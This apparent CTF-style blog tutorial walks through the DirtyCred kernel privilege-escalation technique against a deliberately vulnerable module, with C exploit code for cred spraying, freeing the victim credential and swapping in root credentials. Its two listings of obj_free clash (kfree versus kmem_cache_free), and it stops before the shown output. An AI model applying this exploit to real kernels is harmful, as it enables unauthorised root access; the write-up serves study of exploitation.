In this post, I will explain DirtyCred, a universal and data-only exploitation technique that allows us to escalate privileges without a write primitive. Download the [handouts](https://github.com/r1ru/linux-kernel-exploitation/tree/main/dirty-cred) beforehand.

## Analysis
The vulnerable LKM provides three commands: `CMD_ALLOC`, `CMD_READ`, and `CMD_FREE`. These commands are used to allocate, read from, and free objects defined as follows:
```c
#define OBJ_SIZE    0xc0

struct obj {
    char buf[OBJ_SIZE];
};
```
Note that `obj_alloc` internally uses `kmem_cache_zalloc`. This means a dedicated cache is used for managing these objects:
```c
static long obj_alloc(int id) {
    if (objs[id] != NULL) {
        return -1;
    }
    objs[id] = kmem_cache_zalloc(obj_cachep, GFP_KERNEL);
    if (objs[id] == NULL) {
        return -1;
    }
    return 0;
}
```
Also, note that `kfree` is used instead of `kmem_cache_free` in `obj_free`. This is intentional, as we will use it later to free cred objects:
```c
static long obj_free(int id) {
    kfree(objs[id]);
    return 0;
}
```

## Bugs
In `obj_free`, `objs[id]`, which is a reference to a freed memory region, is not cleared:
```c
static long obj_free(int id) {
    kmem_cache_free(obj_cachep, objs[id]);
    return 0;
}
```
This results in an obvious UAF. By performing cross-cache attack explained in the [previous post](https://r1ru.github.io/posts/1/), we can overlap victim objects with arbitrary kernel objects. However, we only have a read primitive, so it is difficult to control RIP. Therefore, in this post, we will take a data-only approach using DirtyCred.

## DirtyCred
The main idea of DirtyCred is to swap non-root credentials with root credentials. In this post, we target `struct cred`, which is allocated from a dedicated cache called cred. By performing cross-cache attack, we can overlap victim objects with cred objects. Since we can free victim cred objects (via `obj_free`), by spraying root cred objects, we can achieve root privileges.

## Exploitation
The initial steps are the same as in the [previous post](https://r1ru.github.io/posts/1/#exploitation). The difference is in the fourth step, where we allocate a large number of cred objects:
```c
char stack[NUM_CRED_SPRAY][0x1000];
for (int i = 0; i < NUM_CRED_SPRAY; i++) {
    assert(clone(try_read_flag, &stack[i][0xfff], CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND, NULL) != -1);
}
```
Here, we use `clone` with some flags to allocate cred objects with low noise. This technique was discovered by willsroot. See their [blog post](https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html) for more details.

`try_read_flag` is defined as follows. It waits for the atomic variable, `try` to be true, checks if it has root previleges, and then reads the flag:
```c
int try_read_flag(void *arg) {
    char flag[0x10] = {};
    int fd;

    while(atomic_load(&try) != true) {
        sleep(1);
    }

    if (geteuid() == 0) {
        fd = open("/dev/sdb", O_RDONLY);
        assert(fd != -1);
        assert(read(fd, flag, 0x10) != -1);
        printf("[+] Flag: %s\n", flag);
        atomic_store(&win, true);
        exit(0);
    } else {
        atomic_fetch_add(&num_failed, 1);
        exit(0);
    }   
}
```
Next, we locate the victim cred object and free it:
```c
int victim = -1;
struct cred cred = {};
for (int i = 0; i < num_spray; i += objs_per_slab * 2) {
    for (int j = i; j < i + objs_per_slab; j++) {
        obj_read(j, (char *)&cred, sizeof(cred));
        if (cred.uid == getuid() && cred.euid == geteuid()) {
            victim = j;
            printf("[+] Freeing the victim object: id = %d\n", victim);
            obj_free(victim);
        }
    }
}
if (victim == -1) {
    puts("[-] Failed to locate the victim objects");
    exit(1);
}
```
Finally, we spray root cred objects, which causes the victim cred object freed in the previous step to be swapped with a root cred object:
```c
for (int i = 0; i < NUM_ROOT_CRED_SPRAY; i++) {
    int pid = fork();
    if (pid == 0) {
        char *argv[] = {"/bin/su", NULL};
        execve(argv[0], argv, NULL);
    }
}
sleep(1);

puts("\n[*] Attempting");
atomic_store(&try, true);
```
By running this exploit, we can see the flag:
